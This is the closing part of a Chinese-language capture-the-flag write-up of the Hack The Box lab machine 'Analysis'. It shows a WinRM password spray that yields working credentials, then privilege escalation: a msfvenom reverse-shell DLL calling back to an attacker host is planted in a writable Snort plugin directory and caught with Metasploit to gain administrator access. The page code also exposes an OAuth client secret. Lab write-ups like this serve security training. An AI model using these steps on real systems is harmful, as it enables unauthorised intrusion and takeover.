HTTP        10.10.11.250    5985   DC-ANALYSIS      [*] http://10.10.11.250:5985/wsman
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\ajohnson:7y4Z4^*y9Zzj
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\cwilliams:7y4Z4^*y9Zzj
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\wsmith:7y4Z4^*y9Zzj
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\jangel:7y4Z4^*y9Zzj
WINRM       10.10.11.250    5985   DC-ANALYSIS      [-] analysis.htb\technician:7y4Z4^*y9Zzj
WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\JDoe:7y4Z4^*y9Zzj (Pwn3d!)
</code></pre>
<p>然后去连接</p>
<pre><code>┌──(root㉿kali)-[~]
└─# evil-winrm -i 10.10.11.250 -u jdoe -p &#39;7y4Z4^*y9Zzj&#39;
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; whoami
analysis\jdoe
</code></pre>
<p>成功提权到 user</p>
<pre><code>*Evil-WinRM* PS C:\Users\jdoe\Desktop&gt; type user.txt
86e4a40890c7c6dc38234f462b9e23c0
</code></pre>
<p>成功拿到 user 权限的 flag 文件</p>
<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><pre><code>*Evil-WinRM* PS C:\snort\lib&gt; icacls snort_dynamicpreprocessor
snort_dynamicpreprocessor AUTORITE NT\SystŠme:(I)(OI)(CI)(F)
                          BUILTIN\Administrateurs:(I)(OI)(CI)(F)
                          BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
                          BUILTIN\Utilisateurs:(I)(CI)(AD)
                          BUILTIN\Utilisateurs:(I)(CI)(WD)
                          CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
</code></pre>
<p>在 C:\snort\lib 目录下使用 icacls 可以看到，<code>AUTORITE NT\SystŠme</code> 用户拥有完全的控制权限</p>
<p>经过搜索，发现 snort 是一个 IPS（开源入侵防御系统）设备，其中 Snort\lib\snort_dynamicpreprocessor 目录是增强 snort 软件使用的模块，也可以自定义模块，所以这里我们自己创建一个恶意的 dll 上传，替换掉其中的 sf_engine.dll 即可</p>
<pre><code>┌──(root㉿kali)-[~]
└─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.10 LPORT=4444 -f dll -o sf_engine.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 9216 bytes
Saved as: sf_engine.dll
</code></pre>
<pre><code>*Evil-WinRM* PS C:\snort\lib\snort_dynamicpreprocessor&gt; upload /root/sf_engine.dll
                                        
Info: Uploading /root/sf_engine.dll to C:\snort\lib\snort_dynamicpreprocessor\sf_engine.dll
                                        
Data: 12288 bytes of 12288 bytes copied
                                        
Info: Upload successful!
</code></pre>
<pre><code>┌──(root㉿kali)-[~]
└─# msfconsole                                                                                          
Metasploit tip: Use the analyze command to suggest runnable modules for 
hosts
                                                  
 ______________________________________
/ it looks like you&#39;re trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.3.43-dev                          ]
+ -- --=[ 2376 exploits - 1232 auxiliary - 416 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 &gt; use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
payload =&gt; windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; set lhost 10.10.16.10
lhost =&gt; 10.10.16.10
msf6 exploit(multi/handler) &gt; set lport 4444
lport =&gt; 4444
msf6 exploit(multi/handler) &gt; exploit 

[*] Started reverse TCP handler on 10.10.16.10:4444
</code></pre>
<p>然后等着就行</p>
<pre><code>msf6 exploit(multi/handler) &gt; exploit

[*] Started reverse TCP handler on 10.10.16.10:4444 
[*] Sending stage (200774 bytes) to 10.10.11.250
[*] Meterpreter session 1 opened (10.10.16.10:4444 -&gt; 10.10.11.250:49323) at 2024-01-20 19:38:36

meterpreter &gt; shell
Process 6980 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
analysis\administrateur

C:\Windows\system32&gt;cd C:\Users\Administrateur\Desktop
cd C:\Users\Administrateur\Desktop

C:\Users\Administrateur\Desktop&gt;type root.txt
type root.txt
dc980376fb1d18a0c7c6dc38234
</code></pre>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&title=《Analysis - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&title=《Analysis - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Analysis - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2024/02/04/Hackthebox/Insane/Mist/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Mist - Hackthebox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2024/01/16/Hackthebox/Medium/Monitored-Hackthebox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Monitored - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2025</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&title=《Analysis - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&title=《Analysis - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Analysis - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2024/01/20/Hackthebox/Hard/Analysis/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLElEQVR42u3aMY7DMAwF0dz/0k6z5cqZTzoBJI6qYNeJ9VQQpMjXC69rscjz/BnyrdaSIUPGtozrdj11Tqtf4O/9cIgyZMgYwFi9+P6Z1ZP33yUb5XuTIUOGDPKZBOgrXDJkyJDxbMDlobYfrGXIkDGZkQa+tNCtFahfqcVlyJCxIYNflv3+81f6GzJkyNiK0S8sO0Gzv5+/35EhQ8bRjFqBml6rcQxP+2TIkDGZQcJrrTFZu54LSlYZMmQMYPAw2hkm4+kmb53KkCFjAiP9QhoWSdC8TxZRC1OGDBljGGmR+VRayTda7MfKkCFjWwYvRDuXa50hMDRgIUOGjJGM9OI+bUzWfnN5KDJkyBjA4Nf9adKGwmU49/XPX2TIkDGYQcJxbYud4ws6GzJkyDiCwRO72rhGmix29iBDhoyzGbWrN76tdCCj1oSQIUPGqYzOC2r9Un5YQdIpQ4aMAYz4eqtxGUfCd5wmypAh42gGKRH5f9PA2h/vkCFDxjQGT8vS0FlLQ0lyuexyyJAh42gGaRikwZSPhfF0EPVjZciQMYZBgnLajOTPB41MGTJkHMq4wlVjd672HshtZciQsTmDr35LkjcSahdzMmTIOJuRpnp8GKJ/hRccgQwZMgYweHvy2TI4TfWWhyJDhgwZOOF7aqSMNypkyJAho9+kJJdrPMh+KGJlyJBxNKPWDOgMWKQjF8GwhQwZMo5j8NIxKCnTEhSXxK1GpgwZMvZjvAFnWNE/Iq4QZwAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
